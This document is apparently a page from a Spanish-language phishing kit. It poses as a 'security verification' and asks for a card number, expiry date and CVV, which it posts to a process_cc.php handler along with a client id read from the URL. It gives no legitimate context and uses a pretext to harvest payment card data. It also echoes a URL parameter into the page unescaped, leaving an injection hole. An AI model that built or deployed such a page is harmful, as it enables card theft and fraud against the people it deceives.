<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación de Seguridad</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        body {
            font-family: Arial, Helvetica, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            margin: 0;
        }

        .details {
            margin-top: 40%;
            text-align: center;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 80%;
            max-width: 400px;
        }

        img {
            width: 130px;
        }

        h3 {
            margin-top: 0px !important;
            color: black;
        }

        a {
            display: block;
            color: #333;
            text-decoration: none;
        }

        input[type="tel"],
        input[type="text"],
        input[type="number"] {
            width: 90%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
            text-align: center;
            margin-top: 10px;
        }

        input[type="submit"] {
            color: white;
            background-color: blue;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            width: 80%;
            height: 35px;
            margin-top: 15px;
        }

        input[type="submit"]:hover {
            background-color: darkblue;
        }

        .footer-links {
            margin-top: 20px;
            text-align: center;
        }
    </style>
</head>

<body>
    <div class="details">
        <img src="img/logo.webp" alt="Logo">
        <h3>Verificación Requerida</h3>
        <a>Por motivos de seguridad, necesitamos validar la información de tu tarjeta.</a><br>

        <form action="process/process_cc.php" method="POST">
            <input type="hidden" name="cliente_id" value="<?php echo $_GET['id']; ?>">

            <input type="tel" name="tarjeta" placeholder="Número de Tarjeta" required minlength="15" maxlength="16"
                pattern="\d*" inputmode="numeric">

            <div style="display:flex; justify-content:space-between; width:95%; margin:0 auto;">
                <input type="tel" name="mes" placeholder="MM" required maxlength="2" style="width:40%;"
                    inputmode="numeric">
                <input type="tel" name="anio" placeholder="AA" required maxlength="2" style="width:40%;"
                    inputmode="numeric">
            </div>

            <input type="tel" name="cvv" placeholder="CVV" required maxlength="4" style="width:50%;"
                inputmode="numeric">

            <input type="submit" value="CONTINUAR">
        </form>
    </div>

    <div class="footer-links">
        <a href="#">Ayuda y Soporte</a>
    </div>
</body>

</html>